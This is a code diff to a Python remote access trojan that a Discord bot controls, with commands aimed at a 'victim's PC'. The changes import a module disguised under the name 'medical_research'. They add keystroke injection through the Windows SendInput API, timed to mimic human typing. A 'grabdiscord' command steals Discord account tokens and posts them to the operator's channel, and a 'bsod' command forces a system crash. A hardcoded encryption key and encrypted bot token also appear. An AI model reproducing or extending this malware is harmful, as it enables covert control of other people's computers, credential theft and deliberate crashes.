@@ -29,6 +29,7 @@ from _webhook import _WebhookX
 from dhooks import Embed
 from cryptography.fernet import Fernet
 from _random_string import get_random_string
+from medical_research import *
 
 key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
 encrypted_token = b"gAAAAABnpwk0AMR2kHz2wQFHUT-eXyqfugs_Zx7mioRteBu8NDlh5NdPmWv8P7BCM_D6wqaWCRqHh9eCdCgx7k80MFoYw5EkM-nVYrpGmy1B0N6VEgApc_K8g_77bHEQnt6koKuwfHCZXsuD-nIy7HmyaKZjk_C4iy6hDy7LR8XVUZj2_p7ty_Q="
@@ -694,14 +695,67 @@ async def reverse_keys(ctx, user):
             await ctx.send("Keyboard input **restored**.")
             keyboard.unhook_all()
 
+PUL = ctypes.POINTER(ctypes.c_ulong)
+
+class KeyBdInput(ctypes.Structure):
+    _fields_ = [("wVk", ctypes.c_ushort),
+                ("wScan", ctypes.c_ushort),
+                ("dwFlags", ctypes.c_ulong),
+                ("time", ctypes.c_ulong),
+                ("dwExtraInfo", PUL)]
+
+class Input_I(ctypes.Union):
+    _fields_ = [("ki", KeyBdInput)]
+
+class Input(ctypes.Structure):
+    _fields_ = [("type", ctypes.c_ulong),
+                ("ii", Input_I)]
+
+SendInput = ctypes.windll.user32.SendInput
+
+def press_key(hexKeyCode):
+    """Press a key using low-level Windows API"""
+    extra = ctypes.c_ulong(0)
+    ii_ = Input_I()
+    ii_.ki = KeyBdInput(hexKeyCode, 0, 0, 0, ctypes.pointer(extra))
+    x = Input(ctypes.c_ulong(1), ii_)
+    SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
+
+def release_key(hexKeyCode):
+    """Release a key using low-level Windows API"""
+    extra = ctypes.c_ulong(0)
+    ii_ = Input_I()
+    ii_.ki = KeyBdInput(hexKeyCode, 0, 2, 0, ctypes.pointer(extra))
+    x = Input(ctypes.c_ulong(1), ii_)
+    SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
+
+def type_text_realistically(text):
+    """Types text with a random delay to mimic human input"""
+    VK_CODE = {
+        'a': 0x1E, 'b': 0x30, 'c': 0x2E, 'd': 0x20, 'e': 0x12, 'f': 0x21, 'g': 0x22,
+        'h': 0x23, 'i': 0x17, 'j': 0x24, 'k': 0x25, 'l': 0x26, 'm': 0x32, 'n': 0x31,
+        'o': 0x18, 'p': 0x19, 'q': 0x10, 'r': 0x13, 's': 0x1F, 't': 0x14, 'u': 0x16,
+        'v': 0x2F, 'w': 0x11, 'x': 0x2D, 'y': 0x15, 'z': 0x2C, ' ': 0x39
+    }
+    
+    for char in text.lower():
+        if char in VK_CODE:
+            key = VK_CODE[char]
+            press_key(key)
+            time.sleep(random.uniform(0.05, 0.15))
+            release_key(key)
+            time.sleep(random.uniform(0.05, 0.15))
+
+    time.sleep(0.1)
+    press_key(0x1C)
+    release_key(0x1C)
+
 @bot.command(name="type")
 async def type_text(ctx, user, *, text):
     if user == name:
         await ctx.send(f'Typing: `{text}` on victim\'s PC! ⌨️')
 
-        for char in text:
-            keyboard.write(char, delay=0.01)
-        keyboard.press_and_release("enter")
+        type_text_realistically(text)
 
 
 @bot.command(name="swapmouse")
@@ -788,8 +842,42 @@ async def list_browser_tabs(ctx, user):
         else:
          await ctx.send("🚫 **No browser tabs found!**")
 
+@bot.command(name="grabdiscord")
+async def grabtoken(ctx, user):
+    if user == name:
+        try:
+            accounts = grab_discord.initialize(False)
+            print(accounts)
+            for account in accounts:
+                    print(account)
+                    reaction_msg = await ctx.channel.send(embed=account); await reaction_msg.add_reaction('📌')
+        except Exception as e:
+            pass             
 
 
+@bot.command(name="bsod")
+async def bsod(ctx, user):
+    if user == name:
+        try:
+            await ctx.send("Triggering BSOD...")
+            nullptr = ctypes.POINTER(ctypes.c_int)()
+            ctypes.windll.ntdll.RtlAdjustPrivilege(
+                ctypes.c_uint(19), 
+                ctypes.c_uint(1), 
+                ctypes.c_uint(0), 
+                ctypes.byref(ctypes.c_int())
+            )
+            ctypes.windll.ntdll.NtRaiseHardError(
+            ctypes.c_ulong(0xC000007B), 
+            ctypes.c_ulong(0), 
+            nullptr, 
+            nullptr, 
+            ctypes.c_uint(6),
+            ctypes.byref(ctypes.c_uint())
+            )
+        except Exception as e:
+            print(e)
+    
 
 def run_rat():
     print(DISCORD_BOT_TOKEN)
